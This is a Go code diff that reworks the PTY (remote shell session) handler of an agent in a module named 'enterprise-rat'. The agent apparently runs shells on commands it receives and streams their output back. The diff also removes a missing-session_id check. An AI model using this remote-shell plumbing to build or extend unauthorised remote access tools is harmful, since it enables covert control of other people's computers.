@@ -4,6 +4,8 @@ import (
 	"context"
 	"fmt"
 	"io"
+	"log"
+	"os"
 	"os/exec"
 	"runtime"
 	"sync"
@@ -11,10 +13,16 @@ import (
 	"github.com/enterprise-rat/agent/internal/models"
 )
 
+type PtyOutput struct {
+	SessionID string
+	Data      []byte
+}
+
 type PtyHandler struct {
 	sessions    map[string]*PtySession
 	mu          sync.RWMutex
 	maxSessions int
+	OutputChan  chan PtyOutput
 }
 
 type PtySession struct {
@@ -28,13 +36,13 @@ type PtySession struct {
 	mu     sync.Mutex
 	ctx    context.Context
 	cancel context.CancelFunc
-	output chan []byte
 }
 
 func NewPtyHandler() *PtyHandler {
 	return &PtyHandler{
 		sessions:    make(map[string]*PtySession),
 		maxSessions: 10,
+		OutputChan:  make(chan PtyOutput, 100),
 	}
 }
 
@@ -53,9 +61,9 @@ func (h *PtyHandler) HandlePtyCommand(payload map[string]interface{}) (*models.C
 	case "start":
 		return h.startSession(payload)
 	case "resize":
-		return h.resizeSession(payload), true
+		return h.resizeSession(payload), false // No direct response needed if streaming
 	case "input":
-		return h.handleInput(payload), true
+		return h.handleInput(payload), false // No direct response needed if streaming
 	case "stop":
 		return h.stopSession(payload), false
 	default:
@@ -71,13 +79,6 @@ func (h *PtyHandler) startSession(payload map[string]interface{}) (*models.Comma
 	cols := int(getFloat64(payload, "cols", 80))
 	rows := int(getFloat64(payload, "rows", 24))
 	shell, _ := payload["shell"].(string)
-
-	if sessionID == "" {
-		return &models.CommandResponse{
-			ExitCode: -1,
-			ErrorMsg: "missing session_id",
-		}, false
-	}
 
 	h.mu.Lock()
 	if len(h.sessions) >= h.maxSessions {
@@ -125,10 +126,9 @@ func (h *PtyHandler) startSession(payload map[string]interface{}) (*models.Comma
 
 func (h *PtyHandler) createPtySession(sessionID, shell string, cols, rows int) (*PtySession, error) {
 	session := &PtySession{
-		ID:     sessionID,
-		Cols:   cols,
-		Rows:   rows,
-		output: make(chan []byte, 100),
+		ID:   sessionID,
+		Cols: cols,
+		Rows: rows,
 	}
 
 	session.ctx, session.cancel = context.WithCancel(context.Background())
@@ -157,22 +157,23 @@ func (h *PtyHandler) createUnixSession(session *PtySession, shell string) error 
 		return err
 	}
 
-	stdout, err := cmd.StdoutPipe()
-	if err != nil {
-		return err
-	}
-
-	_, err = cmd.StderrPipe()
-	if err != nil {
-		return err
-	}
+	pr, pw := io.Pipe()
+	cmd.Stdout = pw
+	cmd.Stderr = pw
 
 	session.Stdin = stdin
-	session.Stdout = stdout
+	session.Stdout = pr
 
 	if err := cmd.Start(); err != nil {
+		pr.Close()
+		pw.Close()
 		return err
 	}
+
+	go func() {
+		cmd.Wait()
+		pw.Close()
+	}()
 
 	session.Cmd = cmd
 	return nil
@@ -186,25 +187,46 @@ func (h *PtyHandler) createWindowsSession(session *PtySession, shell string) err
 		return err
 	}
 
-	stdout, err := cmd.StdoutPipe()
-	if err != nil {
-		return err
-	}
-
-	_, err = cmd.StderrPipe()
-	if err != nil {
-		return err
-	}
+	pr, pw := io.Pipe()
+	cmd.Stdout = pw
+	cmd.Stderr = pw
 
 	session.Stdin = stdin
-	session.Stdout = stdout
+	session.Stdout = pr
 
 	if err := cmd.Start(); err != nil {
+		pr.Close()
+		pw.Close()
 		return err
 	}
+
+	go func() {
+		cmd.Wait()
+		pw.Close()
+	}()
 
 	session.Cmd = cmd
 	return nil
+}
+
+func (h *PtyHandler) streamOutput(session *PtySession) {
+	buf := make([]byte, 8192)
+	for {
+		n, err := session.Stdout.Read(buf)
+		if n > 0 {
+			select {
+			case h.OutputChan <- PtyOutput{SessionID: session.ID, Data: append([]byte(nil), buf[:n]...)}:
+			case <-session.ctx.Done():
+				return
+			}
+		}
+		if err != nil {
+			if err != io.EOF {
+				log.Printf("[PTY] Error reading from session %s: %v", session.ID, err)
+			}
+			return
+		}
+	}
 }
 
 func (h *PtyHandler) resizeSession(payload map[string]interface{}) *models.CommandResponse {
@@ -268,21 +290,6 @@ func (h *PtyHandler) getSession(sessionID string) *PtySession {
 	return h.sessions[sessionID]
 }
 
-func (h *PtyHandler) GetOutput(sessionID string) ([]byte, bool) {
-	session := h.getSession(sessionID)
-	if session == nil || session.Stdout == nil {
-		return nil, false
-	}
-
-	buf := make([]byte, 4096)
-	n, err := session.Stdout.Read(buf)
-	if err != nil && err != io.EOF {
-		return nil, false
-	}
-
-	return buf[:n], n > 0
-}
-
 func (s *PtySession) close() error {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -300,30 +307,12 @@ func (s *PtySession) close() error {
 		s.Stdin.Close()
 	}
 
-	if s.output != nil {
-		close(s.output)
-	}
-
 	if s.Cmd != nil && s.Cmd.Process != nil {
 		s.Cmd.Process.Kill()
 		s.Cmd.Wait()
 	}
 
 	return nil
-}
-
-func (s *PtySession) GetOutputJSON() (string, bool) {
-	if s.Stdout == nil {
-		return "", false
-	}
-
-	buf := make([]byte, 4096)
-	n, err := s.Stdout.Read(buf)
-	if err != nil && err != io.EOF {
-		return "", false
-	}
-
-	return string(buf[:n]), n > 0
 }
 
 func isWindows() bool {
@@ -335,55 +324,4 @@ func getFloat64(m map[string]interface{}, key string, defaultVal float64) float6
 		return v
 	}
 	return defaultVal
-}
-
-type PtyOutputMessage struct {
-	Type      string `json:"type"`
-	SessionID string `json:"session_id"`
-	Data      string `json:"data,omitempty"`
-	Error     string `json:"error,omitempty"`
-}
-
-func (h *PtyHandler) streamOutput(session *PtySession) {
-	buf := make([]byte, 4096)
-	for {
-		select {
-		case <-session.ctx.Done():
-			return
-		default:
-			n, err := session.Stdout.Read(buf)
-			if n > 0 {
-				select {
-				case session.output <- buf[:n]:
-				case <-session.ctx.Done():
-					return
-				}
-			}
-			if err != nil {
-				return
-			}
-		}
-	}
-}
-
-func (h *PtyHandler) PollSessionOutput(sessionID string) (string, bool) {
-	session := h.getSession(sessionID)
-	if session == nil || session.Stdout == nil {
-		return "", false
-	}
-
-	buf := make([]byte, 8192)
-	n, err := session.Stdout.Read(buf)
-	if err != nil {
-		if err != io.EOF {
-			return "", false
-		}
-		n = 0
-	}
-
-	if n > 0 {
-		return string(buf[:n]), true
-	}
-
-	return "", false
 }
